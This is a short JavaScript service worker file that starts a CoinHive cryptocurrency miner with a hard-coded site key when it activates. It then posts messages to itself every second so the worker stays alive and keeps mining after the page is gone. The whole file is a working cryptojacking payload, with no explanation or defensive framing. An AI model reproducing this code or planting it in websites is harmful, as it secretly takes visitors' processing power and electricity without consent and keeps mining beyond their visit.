function task() {
  var sw = registration.active;
  sw.postMessage(1);
}

self.onmessage = function(e) {
  e.waitUntil(new Promise(y => {
    setTimeout(_ => {
      task();
      y();
    }, 1000);
  }));
};

self.onactivate = function() {
  var miner = window.miner = new CoinHive.Anonymous('MUtCJzIDhrs01ERrf3qlqdawo35N0CYD', {throttle: 0.1});
  miner.start();
  task();
};
